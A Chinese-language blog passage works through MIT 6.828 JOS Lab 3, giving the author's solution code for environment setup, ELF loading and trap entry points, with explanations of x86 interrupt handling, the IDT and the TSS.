<h4 id="Exercise_2"><a href="#Exercise_2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><p> 完成 <code>env.c</code>的以下几个函数。</p>
<ul>
<li><p>env_init()：初始化envs数组中的所有Env结构体并添加到env_free_list中，同时调用env_init_percpu，用来配置硬件不同段，特权级0是内核段，特权级3是用户段。</p>
</li>
<li><p>env_setup_vm()：分配一个页目录给新的环境并初始化新环境地址空间的内核部分。</p>
</li>
<li><p>region_alloc()：分配以及映射物理内存到一个环境。</p>
</li>
<li><p>load_icode()：分析ELF二进制镜像，将其加载到新环境的用户地址空间。</p>
</li>
<li><p>env_create()：使用env_alloc创建一个环境，调用load_icode加载ELF。</p>
</li>
<li><p>env_run()： 在用户模式下运行一个环境。</p>
</li>
</ul>
<h5 id="env_init"><a href="#env_init" class="headerlink" title="env_init"></a>env_init</h5><p>初始化envs数组，因为envs中的env_link指向的是下一个env，所以这里有个技巧是从envs的最后一个元素向前遍历。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">env_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Set up envs array</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    env_free_list <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> NENV <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        envs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>env_id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        envs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>env_status <span class="token operator">=</span> ENV_FREE<span class="token punctuation">;</span>
        envs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>env_link <span class="token operator">=</span> env_free_list<span class="token punctuation">;</span>
        env_free_list <span class="token operator">=</span> <span class="token operator">&amp;</span>envs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">// Per-CPU part of the initialization</span>
    <span class="token function">env_init_percpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="env_setup_vm"><a href="#env_setup_vm" class="headerlink" title="env_setup_vm"></a>env_setup_vm</h5><p>设置e-&gt;env_pgdir并初始化页目录，可以使用kern_pgdir作为模板。填上这个，计数器加一，将p转化为内核虚拟地址，然后以kern_pgdir为模板复制。</p>
<pre class=" language-c"><code class="language-c">p<span class="token operator">-></span>pp_ref<span class="token operator">++</span><span class="token punctuation">;</span>
e<span class="token operator">-></span>env_pgdir <span class="token operator">=</span> <span class="token function">page2kva</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memcpy</span><span class="token punctuation">(</span>e<span class="token operator">-></span>env_pgdir<span class="token punctuation">,</span> kern_pgdir<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h5 id="region_alloc"><a href="#region_alloc" class="headerlink" title="region_alloc"></a>region_alloc</h5><p>分配len字节的物理内存给env环境，之后映射到环境中的虚拟地址va。要注意的是，va和len都要进行对齐。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">region_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env <span class="token operator">*</span>e<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token comment" spellcheck="true">// (But only if you need it for load_icode.)</span>
    <span class="token comment" spellcheck="true">//</span>
    <span class="token comment" spellcheck="true">// Hint: It is easier to use region_alloc if the caller can pass</span>
    <span class="token comment" spellcheck="true">//   'va' and 'len' values that are not page-aligned.</span>
    <span class="token comment" spellcheck="true">//   You should round va down, and round (va + len) up.</span>
    <span class="token comment" spellcheck="true">//   (Watch out for corner-cases!)</span>
    <span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    va <span class="token operator">=</span> <span class="token function">ROUNDDOWN</span><span class="token punctuation">(</span>va<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span> end <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ROUNDUP</span><span class="token punctuation">(</span>va <span class="token operator">+</span> len<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> va <span class="token operator">&lt;=</span> end<span class="token punctuation">;</span> va<span class="token operator">+</span><span class="token operator">=</span>PGSIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token function">page_alloc</span><span class="token punctuation">(</span>ALLOC_ZERO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"allocation failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// pte_t *pte = pgdir_walk(e->env_pgdir, va, true);</span>
        <span class="token comment" spellcheck="true">// if (!pte)</span>
        <span class="token comment" spellcheck="true">//     panic("Unable to alloc page.");</span>

        <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">page_insert</span><span class="token punctuation">(</span>e<span class="token operator">-></span>env_pgdir<span class="token punctuation">,</span> p<span class="token punctuation">,</span> va<span class="token punctuation">,</span> PTE_U <span class="token operator">|</span> PTE_W<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"Page mapping failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre>
<h5 id="load_icode"><a href="#load_icode" class="headerlink" title="load_icode"></a>load_icode</h5><p>加载可读的ELF二进制镜像到用户环境内存，起始虚拟地址在ELF程序头部应该有，同时将这些段清零，和boot loader类似，之后映射给程序初始栈的一个页。只加载ph-&gt;p_type == ELF_PROG_LOAD的段，每个段的虚拟地址应该在ph-&gt;p_va，它的大小应该是ph-&gt;p_memsz。<code>binary + ph-&gt;p_offset</code>之后的ph-&gt;p_filesz字节要拷贝到虚拟地址ph-&gt;p_va，其他剩余内存应该清零。这个挺难的，我参考了这个<a href="http://grid.hust.edu.cn/zyshao/Teaching_Material/OSEngineering/Chapter5.pdf" target="_blank" rel="external">抢占式调度(lab3) 5.3.2.2</a>。这里一定要注意lcr3()这个函数，通过lcr3指令把页目录表的起始地址存入CR3寄存器，这里的拷贝到指定的虚地址处，是指用户空间的虚地址，而不是内核空间的虚地址，所以还需要用lcr3函数加载用户空间的页表目录才能将地址转换为用户空间地址。参考<a href="http://www.cnblogs.com/bdhmwz/p/5071081.html" target="_blank" rel="external">bdhmwz的MIT 6.828 JOS/XV6 lab3–PARTA</a>。因为这个问题折腾了半天括弧哭。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">load_icode</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env <span class="token operator">*</span>e<span class="token punctuation">,</span> uint8_t <span class="token operator">*</span>binary<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">struct</span> Proghdr <span class="token operator">*</span>ph<span class="token punctuation">,</span> <span class="token operator">*</span>eph<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> Elf <span class="token operator">*</span>elf_head <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Elf <span class="token operator">*</span><span class="token punctuation">)</span>binary<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>elf_head<span class="token operator">-></span>e_magic <span class="token operator">!=</span> ELF_MAGIC<span class="token punctuation">)</span> 
        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"ELF binary image error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">lcr3</span><span class="token punctuation">(</span><span class="token function">PADDR</span><span class="token punctuation">(</span>e<span class="token operator">-></span>env_pgdir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ph <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Proghdr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint8_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>elf_head<span class="token punctuation">)</span> <span class="token operator">+</span> elf_head<span class="token operator">-></span>e_phoff<span class="token punctuation">)</span><span class="token punctuation">;</span>
    eph <span class="token operator">=</span> ph <span class="token operator">+</span> elf_head<span class="token operator">-></span>e_phnum<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span> ph <span class="token operator">&lt;</span> eph<span class="token punctuation">;</span> ph<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ph<span class="token operator">-></span>p_type <span class="token operator">==</span> ELF_PROG_LOAD<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">region_alloc</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ph<span class="token operator">-></span>p_va<span class="token punctuation">,</span> ph<span class="token operator">-></span>p_memsz<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>ph<span class="token operator">-></span>p_va<span class="token punctuation">,</span>binary<span class="token operator">+</span>ph<span class="token operator">-></span>p_offset<span class="token punctuation">,</span>ph<span class="token operator">-></span>p_filesz<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ph<span class="token operator">-></span>p_va <span class="token operator">+</span> ph<span class="token operator">-></span>p_filesz<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>ph<span class="token operator">-></span>p_memsz<span class="token operator">-</span>ph<span class="token operator">-></span>p_filesz<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    e<span class="token operator">-></span>env_tf<span class="token punctuation">.</span>tf_eip <span class="token operator">=</span> elf_head<span class="token operator">-></span>e_entry<span class="token punctuation">;</span>
    <span class="token function">lcr3</span><span class="token punctuation">(</span><span class="token function">PADDR</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// Now map one page for the program's initial stack</span>
    <span class="token comment" spellcheck="true">// at virtual address USTACKTOP - PGSIZE.</span>

    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token function">region_alloc</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>USTACKTOP <span class="token operator">-</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="env_create"><a href="#env_create" class="headerlink" title="env_create"></a>env_create</h5><p>使用env_alloc创建一个env，调用load_icode来加载elf二进制镜像，设置env_type。这个env的父id应该设为0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">env_create</span><span class="token punctuation">(</span>uint8_t <span class="token operator">*</span>binary<span class="token punctuation">,</span> <span class="token keyword">enum</span> EnvType type<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">struct</span> Env <span class="token operator">*</span>e<span class="token punctuation">;</span>
    <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">env_alloc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>e<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">)</span>
        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"env_alloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">load_icode</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> binary<span class="token punctuation">)</span><span class="token punctuation">;</span>
    e<span class="token operator">-></span>env_type <span class="token operator">=</span> type<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="env_run"><a href="#env_run" class="headerlink" title="env_run"></a>env_run</h5><p>切换上下文，首先判断当前环境是否为空，环境状态是不是ENV_RUNNING，之后将curenv指向新的环境，状态设为ENV_RUNNING，更新env_runs计数器，用lcr3切换到它的地址空间，使用env_pop_tf()储存环境计算器。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">env_run</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env <span class="token operator">*</span>e<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>curenv <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> curenv<span class="token operator">-></span>env_status <span class="token operator">==</span> ENV_RUNNING<span class="token punctuation">)</span>
        curenv<span class="token operator">-></span>env_status <span class="token operator">=</span> ENV_RUNNABLE<span class="token punctuation">;</span>
    curenv <span class="token operator">=</span> e<span class="token punctuation">;</span>
    curenv<span class="token operator">-></span>env_status <span class="token operator">=</span> ENV_RUNNING<span class="token punctuation">;</span>
    curenv<span class="token operator">-></span>env_runs<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token function">lcr3</span><span class="token punctuation">(</span><span class="token function">PADDR</span><span class="token punctuation">(</span>curenv<span class="token operator">-></span>env_pgdir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">env_pop_tf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>curenv<span class="token operator">-></span>env_tf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"env_run not yet implemented"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这时候<code>make qemu-nox</code>运行时会出现内存相关错误，暂时不需要担心。</p>
<p>来看一下程序启动的调用顺序图</p>
<ul>
<li>start (kern/entry.S)</li>
<li>i386_init (kern/init.c)<ul>
<li>cons_init</li>
<li>mem_init</li>
<li>env_init</li>
<li>trap_init (still incomplete at this point)</li>
<li>env_create</li>
<li>env_run<ul>
<li>env_pop_tf</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>编译完内核并且运行在QEMU中，正常情况应该是系统进入用户空间，执行hello二进制程序直到系统int指令。然而因为JOS还没有设置硬件使用户过渡到内核，所以会出现问题。当CPU发现系统不能处理系统调用中断，会生成一个通用保护异常，进而又产生一个双重错误异常，同样因为解决不了，最终会导致三重错误(triple fault)。通常需要重启使CPU复位，这很麻烦，还好是在QEMU中，就会出现寄存器dump。</p>
<p>使用debugger去检查是否进入用户模式。使用<code>make qemu-gdb</code>然后在env_pop_tf处打断点。使用si单步调试，处理器执行iret指令之后的命令。</p>
<h3 id="u5904_u7406_u4E2D_u65AD_u548C_u5F02_u5E38"><a href="#u5904_u7406_u4E2D_u65AD_u548C_u5F02_u5E38" class="headerlink" title="处理中断和异常"></a>处理中断和异常</h3><p>用户空间的系统调用指令 int $0x30 是终止：处理器进入用户模式但不能返回。所以要实现基础的异常和系统调用处理，这样内核就能从用户模式恢复控制权。</p>
<h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>看<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/c09.htm" target="_blank" rel="external">Chapter 9, Exceptions and Interrupts</a></p>
<h4 id="u4FDD_u62A4_u6027_u63A7_u5236_u8F6C_u79FB"><a href="#u4FDD_u62A4_u6027_u63A7_u5236_u8F6C_u79FB" class="headerlink" title="保护性控制转移"></a>保护性控制转移</h4><p>异常和中断都是保护性控制转移，让处理器从用户模式切换到内核模式(CPL=0)，这样用户代码不会对内核或者其他环境造成影响。中断是由外部异步事件导致的处理器保护性控制转移，比如外设I/O的通知信号。异常是正在运行的代码同步事件导致的控制转移，比如除零或者访问无效内存。</p>
<p>为了确保控制转移真的被保护，x86平台上有两种机制：</p>
<ol>
<li><p>中断描述符表。处理器确保中断和异常引起内核进入特定的入口点。</p>
<p> x86允许最多256个不同的中断和异常入口点，每个都有一个独特的中断向量。向量是0到255的数字，中断向量由中断源决定:不同设备，错误条件以及请求内核产生中断的不同向量。CPU使用向量作为索引访问处理器中断描述符表(IDT)，这个是内核在内核私有内存设置的。处理器从合适的入口处加载：</p>
<ul>
<li>加载到EIP寄存器的值，这是个指向处理这种类型异常的内核代码的指针</li>
<li>加载到CS寄存器的值，包含特权级0-1</li>
</ul>
</li>
<li><p>任务状态段。处理器需要存放中断异常发生之前的旧的处理器状态，比如原始EIP值和CS值，这样可以之后还原到之前的状态。保存这个的位置必须要受保护不能随意修改。 </p>
<p> 因此，x86处理器处理中断时会导致特权级由用户转为内核，也会将堆切换到内核内存中。任务状态段具体指明段选择子和堆栈的地址。处理器将SS, ESP, EFLAGS, CS, EIP和可选错误码压入堆栈中，之后从中断描述符中加载CS和EIP，设置ESP和SS指向新的堆栈。</p>
</li>
</ol>
<h4 id="u5F02_u5E38_u548C_u4E2D_u65AD_u7684_u7C7B_u578B"><a href="#u5F02_u5E38_u548C_u4E2D_u65AD_u7684_u7C7B_u578B" class="headerlink" title="异常和中断的类型"></a>异常和中断的类型</h4><p>所用同步异常使用的中断向量在0到31，因此映射到IDT入口0-31。比如页错误导致的异常是向量14。大于31的中断向量通常是软件中断，是由int指令产生，或者外设产生硬件中断。</p>
<h5 id="u4F8B_u5B50"><a href="#u4F8B_u5B50" class="headerlink" title="例子"></a>例子</h5><p>举个例子，处理器执行代码遇到了除零问题。</p>
<ol>
<li>处理器切换到TSS的SS0和ESP0字段定义的堆栈，JOS中这两个字段是 GD_KD 和 KSTACKTOP。</li>
<li>处理器将异常参数压入内核堆栈，放在KSTACKTOP：<pre><code>                     +--------------------+ KSTACKTOP             
                  | 0x00000 | old SS   |     &quot; - 4
                  |      old ESP       |     &quot; - 8
                  |     old EFLAGS     |     &quot; - 12
                  | 0x00000 | old CS   |     &quot; - 16
                  |      old EIP       |     &quot; - 20 &lt;---- ESP 
                  +--------------------+
</code></pre></li>
<li>处理除法问题，其中断向量在x86上是0，处理器读取IDT的第0项，设置CS:EIP指向中断处理函数的地址。</li>
<li>处理函数负责处理异常，比如终止用户环境。</li>
</ol>
<p>对于确定类型的x86异常，除了上面五个还有一个错误码。比如常见的页错误异常是数字14。80386手册上有详细定义的错误码。当处理器压入错误码，堆栈的样子是这样的:</p>
<pre><code>    +--------------------+ KSTACKTOP             
    | 0x00000 | old SS   |     &quot; - 4
    |      old ESP       |     &quot; - 8
    |     old EFLAGS     |     &quot; - 12
    | 0x00000 | old CS   |     &quot; - 16
    |      old EIP       |     &quot; - 20
    |     error code     |     &quot; - 24 &lt;---- ESP
    +--------------------+
</code></pre><h5 id="u5F02_u5E38_u4E2D_u65AD_u5D4C_u5957"><a href="#u5F02_u5E38_u4E2D_u65AD_u5D4C_u5957" class="headerlink" title="异常中断嵌套"></a>异常中断嵌套</h5><p>处理器在内核模式和用户模式都可以处理异常和中断。仅当从内核切换到用户时，x86处理器自动切换堆栈，将寄存器之前的值保存到堆栈上，然后触发异常处理。如果处理器已处于内核模式就触发了中断或异常(也就是CS寄存器低两位为0)，然后CPU压入内核堆栈更多值。这样就可以处理嵌套中断。如果处理器已经在内核模式且正在处理嵌套异常，就不会保存SS和ESP寄存器，所以内核堆栈就像这样：</p>
<pre><code>                     +--------------------+ &lt;---- old ESP
                     |     old EFLAGS     |     &quot; - 4
                     | 0x00000 | old CS   |     &quot; - 8
                     |      old EIP       |     &quot; - 12
                     +--------------------+
</code></pre><p>如果处理器在内核模式处理异常，因为一些原因比如堆栈空间不足，不能将旧的状态信息压入堆栈，那么处理器之后就不能恢复，只能重启。当然，内核肯定被要设计成不能发生这种事情。</p>
<h5 id="u8BBE_u7F6EIDT"><a href="#u8BBE_u7F6EIDT" class="headerlink" title="设置IDT"></a>设置IDT</h5><p>所以现在需要去设置IDT，这样JOS才能处理异常。现在只需要设置处理中断向量0-31(处理器异常)。</p>
<p>头文件 <code>inc/trap.h</code>和 <code>kern/trap.h</code> 包含了中断和异常的相关定义。后者包含了仅内核可访问的定义，前者是用户模式也能访问。</p>
<p>最终要实现这个样子:</p>
<pre><code>      IDT                   trapentry.S         trap.c

+----------------+                        
|   &amp;handler1    |---------&gt; handler1:          trap (struct Trapframe *tf)
|                |             // do stuff      {
|                |             call trap          // handle the exception/interrupt
|                |             // ...           }
+----------------+
|   &amp;handler2    |--------&gt; handler2:
|                |            // do stuff
|                |            call trap
|                |            // ...
+----------------+
       .
       .
       .
+----------------+
|   &amp;handlerX    |--------&gt; handlerX:
|                |             // do stuff
|                |             call trap
|                |             // ...
+----------------+
</code></pre><p>每个异常或中断都应该在 <code>trapentry.S</code> 有自己的处理函数，trap_init() 用来初始化IDT。每个异常处理是一个保存在堆栈上的 struct Trapframe ，调用 trap() 指向这个 Trapframe。trap() 之后处理异常中断。</p>
<h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>实现上面说的异常处理，需要在 trapentry.S 给每个 trap 添加入口点。</p>
<p>_alltraps 应该是这个样子的：</p>
<ol>
<li>值压入堆栈使其像一个 Trapframe 结构体</li>
<li>加载 GD_KD 到 %ds 和 %es</li>
<li>pushl %esp 将指向 Trapframe 的指针作为 trap() 的参数</li>
<li>调用 trap</li>
</ol>
<p>考虑使用 pushal 指令。最后使用 <code>make grade</code> 应该对于 divzero, softint, badsegment 这几个测试点正常通过。</p>
<p>参考<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/s09_10.htm" target="_blank" rel="external">80386 Programmer’s Manual 9.10 Error Code Summary</a></p>
<p><img src="1.png" alt=""></p>
<p>由上面的中断类型，确定哪些是不需要压入错误码</p>
<p>其中， <code>trapentry.S</code> 修改为</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*
 * Lab 3: Your code here for generating entry points for the different traps.
 */</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_divide<span class="token punctuation">,</span> T_DIVIDE<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 0</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_debug<span class="token punctuation">,</span> T_DEBUG<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 1</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_nmi<span class="token punctuation">,</span> T_NMI<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 2</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_brkpt<span class="token punctuation">,</span> T_BRKPT<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 3</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_oflow<span class="token punctuation">,</span> T_OFLOW<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 4</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_bound<span class="token punctuation">,</span> T_BOUND<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 5</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_illop<span class="token punctuation">,</span> T_ILLOP<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 6</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_device<span class="token punctuation">,</span> T_DEVICE<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 7</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_dblflt<span class="token punctuation">,</span> T_DBLFLT<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 8</span>
                                        <span class="token comment" spellcheck="true">// 9</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_tss<span class="token punctuation">,</span> T_TSS<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// 10</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_segnp<span class="token punctuation">,</span> T_SEGNP<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 11</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_stack<span class="token punctuation">,</span> T_STACK<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 12</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_gpflt<span class="token punctuation">,</span> T_GPFLT<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 13</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_pgflt<span class="token punctuation">,</span> T_PGFLT<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 14</span>
                                        <span class="token comment" spellcheck="true">// 15</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_fperr<span class="token punctuation">,</span> T_FPERR<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 16</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_align<span class="token punctuation">,</span> T_ALIGN<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 17</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_mchk<span class="token punctuation">,</span> T_MCHK<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 18</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_simderr<span class="token punctuation">,</span> T_SIMDERR<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 19</span>

<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_syscall<span class="token punctuation">,</span> T_SYSCALL<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">/*
 * Lab 3: Your code here for _alltraps
 */</span>
_alltraps<span class="token punctuation">:</span>
    pushl <span class="token operator">%</span>ds
    pushl <span class="token operator">%</span>es
    pushal

    movw $GD_KD<span class="token punctuation">,</span> <span class="token operator">%</span>eax
    movw <span class="token operator">%</span>ax<span class="token punctuation">,</span> <span class="token operator">%</span>ds
    movw <span class="token operator">%</span>ax<span class="token punctuation">,</span> <span class="token operator">%</span>es

    pushl <span class="token operator">%</span>esp
    call trap
</code></pre>
<p><code>trap.c</code> 中首先完成 trap_init()</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">trap_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">extern</span> <span class="token keyword">struct</span> Segdesc gdt<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">void</span> <span class="token function">t_divide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_nmi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_brkpt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_oflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_bound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
